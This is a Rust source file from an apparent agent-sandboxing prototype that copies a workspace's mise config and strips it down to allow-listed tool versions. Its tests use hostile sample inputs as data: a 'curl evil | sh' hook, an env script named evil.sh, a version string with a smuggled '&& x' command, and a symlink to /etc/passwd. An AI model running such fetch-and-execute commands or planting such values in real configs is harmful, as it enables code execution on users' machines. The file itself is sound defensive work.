//! Snapshot of a workspace's mise config for `rocm agents run` (PROTOTYPE).
//!
//! The agent can edit its workspace, so the toolchain is provisioned from a
//! copy taken before the agent starts, never from the live files. The copy is
//! also *reduced*: only the `[tools]` requests survive, as plain versions for
//! allow-listed backends. mise runs more than installers during `mise install`
//! — `[env]` `_.source` scripts and `[hooks]` run unless `MISE_NO_ENV` /
//! `MISE_NO_HOOKS` are set, and a tool's own `postinstall` option runs even
//! with both (checked against mise 2026.11.8) — so the provisioning sandbox is
//! handed a generated `mise.toml` that cannot carry any of them.

use std::collections::BTreeMap;
use std::path::Path;

use anyhow::{Context, Result, bail};
use sha2::{Digest, Sha256};

/// Config files read from the workspace root, lowest precedence first (a tool
/// in a later file replaces the same tool from an earlier one, as in mise).
pub(crate) const CONFIG_FILES: &[&str] = &[".tool-versions", "mise.toml", ".mise.toml"];
/// The lockfile honoured when present.
pub(crate) const LOCK_FILE: &str = "mise.lock";
/// Backends whose downloads mise verifies against a published checksum. A tool
/// named with any other backend prefix is refused; a bare registry name is
/// left to mise, which is run with every other backend disabled
/// ([`DISABLED_BACKENDS`]).
pub(crate) const ALLOWED_BACKENDS: &[&str] = &["core", "aqua", "github", "ubi"];
/// Every backend the pinned mise knows (`mise backends ls` of
/// [`super::mise_bin::MISE_VERSION`]) that is not in [`ALLOWED_BACKENDS`],
/// passed as `MISE_DISABLE_BACKENDS` so a bare name cannot fall back to a
/// plugin (asdf, vfox) or a package manager that runs build scripts.
pub(crate) const DISABLED_BACKENDS: &[&str] = &[
    "asdf", "cargo", "conda", "dotnet", "forgejo", "gem", "gitlab", "go", "npm", "packslip",
    "pypi", "s3", "spinel", "spm", "http", "vfox",
];
/// Larger config files are refused rather than read.
const MAX_FILE_BYTES: u64 = 1024 * 1024;

/// One file as it was in the workspace when the snapshot was taken.
#[derive(Debug, Clone)]
pub(crate) struct SnapshotFile {
    pub name: &'static str,
    pub bytes: Vec<u8>,
}

#[derive(Debug)]
pub(crate) struct Snapshot {
    /// The config files and lockfile that existed, byte for byte.
    pub files: Vec<SnapshotFile>,
    /// Tool name → requested versions, after precedence and validation.
    pub tools: BTreeMap<String, Vec<String>>,
    /// The lockfile, validated, when the workspace has one.
    pub lock: Option<Vec<u8>>,
    /// What the workspace config held that provisioning does not use, such as
    /// `mise.toml [env]`.
    pub ignored: Vec<String>,
}

impl Snapshot {
    /// Short content digest of the files, to tell whether the workspace still
    /// holds what was snapshotted.
    pub(crate) fn digest(&self) -> String {
        digest_files(&self.files)
    }

    pub(crate) fn file_names(&self) -> Vec<&'static str> {
        self.files.iter().map(|f| f.name).collect()
    }

    /// The `mise.toml` handed to the provisioning sandbox: `[tools]` only.
    pub(crate) fn render_config(&self) -> String {
        let mut tools = toml::Table::new();
        for (name, versions) in &self.tools {
            let value = match versions.as_slice() {
                [one] => toml::Value::String(one.clone()),
                many => toml::Value::Array(many.iter().cloned().map(toml::Value::String).collect()),
            };
            tools.insert(name.clone(), value);
        }
        let mut doc = toml::Table::new();
        doc.insert("tools".into(), toml::Value::Table(tools));
        format!(
            "# Generated by `rocm agents run` from a snapshot of the workspace's mise\n\
             # config: tool requests only, no env, hooks, tasks or tool options.\n{}",
            toml::to_string(&doc).expect("a table of strings serializes")
        )
    }

    /// Writes the generated config (and the lockfile) into `dir` for the
    /// provisioning sandbox, and the original files into `original` for the
    /// record.
    pub(crate) fn write(&self, dir: &Path, original: &Path) -> Result<()> {
        std::fs::create_dir_all(dir)?;
        std::fs::create_dir_all(original)?;
        std::fs::write(dir.join("mise.toml"), self.render_config())?;
        if let Some(lock) = &self.lock {
            std::fs::write(dir.join(LOCK_FILE), lock)?;
        }
        for file in &self.files {
            std::fs::write(original.join(file.name), &file.bytes)?;
        }
        Ok(())
    }
}

/// Reads the mise config files present in the workspace root. Empty when there
/// are none; a lockfile alone does not count as a config.
pub(crate) fn read_workspace(workspace: &Path) -> Result<Vec<SnapshotFile>> {
    let mut files = Vec::new();
    for name in CONFIG_FILES.iter().chain([&LOCK_FILE]) {
        let path = workspace.join(name);
        let meta = match std::fs::symlink_metadata(&path) {
            Ok(meta) => meta,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e).with_context(|| format!("cannot read {}", path.display())),
        };
        if !meta.file_type().is_file() {
            bail!(
                "{} is not a regular file (a symlink or directory); provisioning reads only plain files",
                path.display()
            );
        }
        if meta.len() > MAX_FILE_BYTES {
            bail!("{} is larger than {MAX_FILE_BYTES} bytes", path.display());
        }
        let bytes =
            std::fs::read(&path).with_context(|| format!("cannot read {}", path.display()))?;
        files.push(SnapshotFile { name, bytes });
    }
    if files.iter().all(|f| f.name == LOCK_FILE) {
        files.clear();
    }
    Ok(files)
}

/// Takes the snapshot: `None` when the workspace has no mise config.
pub(crate) fn take(workspace: &Path) -> Result<Option<Snapshot>> {
    let files = read_workspace(workspace)?;
    if files.is_empty() {
        return Ok(None);
    }
    from_files(files).map(Some)
}

/// Builds the snapshot from file contents. Refuses (rather than drops) any
/// tool request provisioning cannot honour safely, naming it.
pub(crate) fn from_files(files: Vec<SnapshotFile>) -> Result<Snapshot> {
    let mut tools = BTreeMap::new();
    let mut ignored = Vec::new();
    let mut lock = None;
    for name in CONFIG_FILES {
        let Some(file) = files.iter().find(|f| f.name == *name) else {
            continue;
        };
        let text =
            std::str::from_utf8(&file.bytes).with_context(|| format!("{name} is not UTF-8"))?;
        let requests = if *name == ".tool-versions" {
            parse_tool_versions(text)?
        } else {
            parse_mise_toml(name, text, &mut ignored)?
        };
        // Later files take precedence, tool by tool.
        tools.extend(requests);
    }
    if let Some(file) = files.iter().find(|f| f.name == LOCK_FILE) {
        let text = std::str::from_utf8(&file.bytes)
            .with_context(|| format!("{LOCK_FILE} is not UTF-8"))?;
        validate_lock(text)?;
        lock = Some(file.bytes.clone());
    }
    Ok(Snapshot {
        files,
        tools,
        lock,
        ignored,
    })
}

/// Digest of the mise files currently in `workspace`, comparable with
/// [`Snapshot::digest`]; `None` when there are none.
pub(crate) fn workspace_digest(workspace: &Path) -> Result<Option<String>> {
    let files = read_workspace(workspace)?;
    Ok((!files.is_empty()).then(|| digest_files(&files)))
}

fn digest_files(files: &[SnapshotFile]) -> String {
    let mut hasher = Sha256::new();
    for file in files {
        hasher.update(file.name.as_bytes());
        hasher.update([0]);
        hasher.update((file.bytes.len() as u64).to_le_bytes());
        hasher.update(&file.bytes);
    }
    format!("{:x}", hasher.finalize())[..16].to_owned()
}

fn parse_tool_versions(text: &str) -> Result<Vec<(String, Vec<String>)>> {
    let mut out = Vec::new();
    for (n, line) in text.lines().enumerate() {
        let line = line.split('#').next().unwrap_or_default().trim();
        let mut words = line.split_whitespace();
        let Some(tool) = words.next() else { continue };
        let versions: Vec<String> = words.map(str::to_owned).collect();
        let at = format!(".tool-versions line {}", n + 1);
        check_tool(tool, &at)?;
        if versions.is_empty() {
            bail!("{at}: `{tool}` has no version");
        }
        for version in &versions {
            check_version(tool, version, &at)?;
        }
        out.push((tool.to_owned(), versions));
    }
    Ok(out)
}

fn parse_mise_toml(
    name: &str,
    text: &str,
    ignored: &mut Vec<String>,
) -> Result<Vec<(String, Vec<String>)>> {
    let doc: toml::Table = text
        .parse()
        .with_context(|| format!("{name} is not valid TOML"))?;
    let mut out = Vec::new();
    for (key, value) in &doc {
        if key != "tools" {
            ignored.push(match value {
                toml::Value::Table(_) => format!("{name} [{key}]"),
                _ => format!("{name} {key}"),
            });
            continue;
        }
        let toml::Value::Table(tools) = value else {
            bail!("{name}: `tools` is not a table");
        };
        for (tool, request) in tools {
            let at = format!("{name} [tools]");
            check_tool(tool, &at)?;
            let versions = match request {
                toml::Value::String(v) => vec![v.clone()],
                toml::Value::Array(items) => items
                    .iter()
                    .map(|item| match item {
                        toml::Value::String(v) => Ok(v.clone()),
                        _ => bail!(
                            "{at}: `{tool}` lists a version that is not a string; tool options are not supported"
                        ),
                    })
                    .collect::<Result<_>>()?,
                toml::Value::Table(options) => {
                    if let Some(extra) = options.keys().find(|k| *k != "version") {
                        bail!(
                            "{at}: `{tool}` sets the tool option `{extra}`; provisioning accepts only a version, \
                             because tool options such as `postinstall` run commands during install"
                        );
                    }
                    match options.get("version") {
                        Some(toml::Value::String(v)) => vec![v.clone()],
                        _ => bail!("{at}: `{tool}` has no string `version`"),
                    }
                }
                _ => bail!("{at}: `{tool}` must be a version string"),
            };
            if versions.is_empty() {
                bail!("{at}: `{tool}` has no version");
            }
            for version in &versions {
                check_version(tool, version, &at)?;
            }
            out.push((tool.clone(), versions));
        }
    }
    Ok(out)
}

/// A tool is a bare registry name (`node`, `jq`) or `backend:spec` with an
/// allow-listed backend. Bracketed tool options (`ubi:o/r[exe=x]`) are refused.
fn check_tool(tool: &str, at: &str) -> Result<()> {
    let name_ok = |s: &str, extra: &[char]| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c) || extra.contains(&c))
    };
    match tool.split_once(':') {
        None if name_ok(tool, &[]) => Ok(()),
        None => bail!("{at}: `{tool}` is not a plain tool name"),
        Some((backend, spec)) => {
            if !ALLOWED_BACKENDS.contains(&backend) {
                bail!(
                    "{at}: `{tool}` uses the `{backend}` backend; provisioning allows only {} \
                     (checksum-verified downloads, no plugins or build scripts)",
                    ALLOWED_BACKENDS.join(", ")
                );
            }
            if !name_ok(spec, &['/']) {
                bail!(
                    "{at}: `{tool}` is not a plain `backend:owner/repo` name (tool options are not supported)"
                );
            }
            Ok(())
        }
    }
}

/// A plain version or alias (`1.7.1`, `24`, `latest`, `lts`). Refuses the
/// prefixed forms (`ref:` builds from source, `path:` points outside the
/// store, `sub-1:` ...).
fn check_version(tool: &str, version: &str, at: &str) -> Result<()> {
    let ok = version
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphanumeric())
        && version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._+-".contains(c));
    if !ok {
        bail!("{at}: `{tool}` version `{version}` is not a plain version");
    }
    Ok(())
}

/// Lock entries name the backend a tool resolved to; one outside the
/// allow-list is refused here as well as disabled in mise. Per-tool options
/// are refused as in the config.
fn validate_lock(text: &str) -> Result<()> {
    let doc: toml::Table = text
        .parse()
        .with_context(|| format!("{LOCK_FILE} is not valid TOML"))?;
    for key in doc.keys() {
        if key != "lockfile_version" && key != "tools" {
            bail!("{LOCK_FILE}: unexpected top-level key `{key}`");
        }
    }
    let Some(tools) = doc.get("tools") else {
        return Ok(());
    };
    let tools = tools
        .as_table()
        .with_context(|| format!("{LOCK_FILE}: `tools` is not a table"))?;
    for (tool, entries) in tools {
        let entries = entries
            .as_array()
            .with_context(|| format!("{LOCK_FILE}: `tools.{tool}` is not an array of tables"))?;
        for entry in entries {
            let entry = entry
                .as_table()
                .with_context(|| format!("{LOCK_FILE}: `tools.{tool}` entry is not a table"))?;
            for (key, value) in entry {
                match key.as_str() {
                    "version" | "specifiers" => {}
                    "backend" => {
                        let backend = value.as_str().unwrap_or_default();
                        let prefix = backend.split_once(':').map_or(backend, |(p, _)| p);
                        if !ALLOWED_BACKENDS.contains(&prefix) {
                            bail!(
                                "{LOCK_FILE}: `{tool}` is locked to backend `{backend}`; provisioning allows only {}",
                                ALLOWED_BACKENDS.join(", ")
                            );
                        }
                    }
                    "options" if value.as_table().is_some_and(toml::Table::is_empty) => {}
                    "options" => bail!(
                        "{LOCK_FILE}: `{tool}` is locked with tool options; provisioning does not support tool options"
                    ),
                    platform if platform.starts_with("platforms.") => {}
                    other => bail!("{LOCK_FILE}: `{tool}` has unexpected key `{other}`"),
                }
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn snap(files: &[(&'static str, &str)]) -> Result<Snapshot> {
        from_files(
            files
                .iter()
                .map(|(name, text)| SnapshotFile {
                    name,
                    bytes: text.as_bytes().to_vec(),
                })
                .collect(),
        )
    }

    fn err(files: &[(&'static str, &str)]) -> String {
        format!("{:#}", snap(files).unwrap_err())
    }

    #[test]
    fn only_tool_requests_reach_the_generated_config() {
        let s = snap(&[(
            "mise.toml",
            r#"
[tools]
jq = "1.7.1"
"aqua:astral-sh/uv" = { version = "0.13.8" }
node = ["24", "22"]
[env]
_.source = "./evil.sh"
[hooks]
enter = "curl evil | sh"
[tasks.build]
run = "make"
[settings]
disable_backends = []
"#,
        )])
        .unwrap();
        let config = s.render_config();
        let doc: toml::Table = config.parse().unwrap();
        assert_eq!(doc.keys().collect::<Vec<_>>(), ["tools"], "{config}");
        assert_eq!(doc["tools"]["jq"].as_str(), Some("1.7.1"), "{config}");
        assert_eq!(doc["tools"]["aqua:astral-sh/uv"].as_str(), Some("0.13.8"));
        assert_eq!(doc["tools"]["node"].as_array().unwrap().len(), 2);
        for word in ["evil", "curl", "make", "disable_backends"] {
            assert!(!config.contains(word), "{word} leaked into:\n{config}");
        }
        assert_eq!(
            s.ignored,
            [
                "mise.toml [env]",
                "mise.toml [hooks]",
                "mise.toml [settings]",
                "mise.toml [tasks]"
            ]
        );
    }

    #[test]
    fn a_tool_option_such_as_postinstall_is_refused() {
        let e = err(&[(
            "mise.toml",
            "[tools]\njq = { version = \"1.7.1\", postinstall = \"touch /x\" }\n",
        )]);
        assert!(e.contains("`postinstall`"), "{e}");
        let e = err(&[("mise.toml", "[tools]\n\"ubi:o/r[exe=x]\" = \"1\"\n")]);
        assert!(e.contains("tool options are not supported"), "{e}");
    }

    #[test]
    fn plugin_and_build_backends_are_refused_and_checksummed_ones_allowed() {
        for tool in [
            "asdf:mise-plugins/asdf-jq",
            "vfox:version-fox/vfox-jq",
            "cargo:ripgrep",
            "npm:x",
        ] {
            let e = err(&[("mise.toml", &format!("[tools]\n\"{tool}\" = \"1\"\n"))]);
            assert!(
                e.contains("backend; provisioning allows only"),
                "{tool}: {e}"
            );
        }
        let e = err(&[(".tool-versions", "asdf:foo/bar 1\n")]);
        assert!(e.contains(".tool-versions line 1"), "{e}");
        for tool in [
            "core:node",
            "aqua:jqlang/jq",
            "github:cli/cli",
            "ubi:BurntSushi/ripgrep",
            "jq",
        ] {
            snap(&[("mise.toml", &format!("[tools]\n\"{tool}\" = \"1\"\n"))])
                .unwrap_or_else(|e| panic!("{tool}: {e:#}"));
        }
    }

    #[test]
    fn prefixed_versions_are_refused() {
        for version in ["ref:main", "path:/opt/x", "sub-1:latest", "", "1.0 && x"] {
            let e = err(&[("mise.toml", &format!("[tools]\njq = \"{version}\"\n"))]);
            assert!(e.contains("is not a plain version"), "{version}: {e}");
        }
    }

    #[test]
    fn later_files_take_precedence_tool_by_tool() {
        let s = snap(&[
            (".tool-versions", "jq 1.6\nuv 0.1.0 # comment\n"),
            ("mise.toml", "[tools]\njq = \"1.7\"\n"),
            (".mise.toml", "[tools]\njq = \"1.7.1\"\n"),
        ])
        .unwrap();
        assert_eq!(s.tools["jq"], ["1.7.1"]);
        assert_eq!(s.tools["uv"], ["0.1.0"]);
    }

    #[test]
    fn lockfile_backends_are_checked_too() {
        let lock = |backend: &str| {
            format!(
                "lockfile_version = 4\n[[tools.jq]]\nversion = \"1.7.1\"\nbackend = \"{backend}\"\n\
                 specifiers = [\"1.7.1\"]\n[tools.jq.\"platforms.linux-x64\"]\nchecksum = \"sha256:00\"\nurl = \"https://x\"\n"
            )
        };
        let cfg = ("mise.toml", "[tools]\njq = \"1.7.1\"\n");
        let ok = lock("aqua:jqlang/jq");
        assert!(snap(&[cfg, ("mise.lock", &ok)]).unwrap().lock.is_some());
        let bad = lock("asdf:mise-plugins/asdf-jq");
        let e = err(&[cfg, ("mise.lock", &bad)]);
        assert!(e.contains("locked to backend `asdf:"), "{e}");
        let opts = ok.replace(
            "specifiers",
            "options = { postinstall = \"x\" }\nspecifiers",
        );
        let e = err(&[cfg, ("mise.lock", &opts)]);
        assert!(e.contains("tool options"), "{e}");
    }

    #[test]
    fn snapshot_is_independent_of_later_workspace_edits() {
        let ws = std::env::temp_dir().join(format!("rocm-mise-snap-{}", std::process::id()));
        std::fs::create_dir_all(&ws).unwrap();
        std::fs::write(ws.join("mise.toml"), "[tools]\njq = \"1.7.1\"\n").unwrap();
        let s = take(&ws).unwrap().unwrap();
        let before = workspace_digest(&ws).unwrap();
        assert_eq!(before.as_deref(), Some(s.digest().as_str()));
        // The agent edits the live file after the snapshot was taken.
        std::fs::write(
            ws.join("mise.toml"),
            "[tools]\njq = \"1.7.1\"\nuv = \"0.13.8\"\n",
        )
        .unwrap();
        assert_eq!(s.tools.keys().collect::<Vec<_>>(), ["jq"]);
        assert!(!s.render_config().contains("uv"));
        assert_ne!(workspace_digest(&ws).unwrap(), before);
        // A same-length edit (a pinned version swapped) is a change too.
        std::fs::write(ws.join("mise.toml"), "[tools]\njq = \"1.6.0\"\n").unwrap();
        assert_ne!(workspace_digest(&ws).unwrap(), before);
        std::fs::remove_dir_all(&ws).unwrap();
    }

    #[test]
    #[cfg(unix)]
    fn no_config_means_no_snapshot_and_symlinks_are_refused() {
        let ws = std::env::temp_dir().join(format!("rocm-mise-snap-none-{}", std::process::id()));
        std::fs::create_dir_all(&ws).unwrap();
        assert!(take(&ws).unwrap().is_none());
        std::fs::write(ws.join("mise.lock"), "lockfile_version = 4\n").unwrap();
        assert!(
            take(&ws).unwrap().is_none(),
            "a lockfile alone is not a config"
        );
        std::os::unix::fs::symlink("/etc/passwd", ws.join("mise.toml")).unwrap();
        let e = format!("{:#}", take(&ws).unwrap_err());
        assert!(e.contains("not a regular file"), "{e}");
        std::fs::remove_dir_all(&ws).unwrap();
    }
}
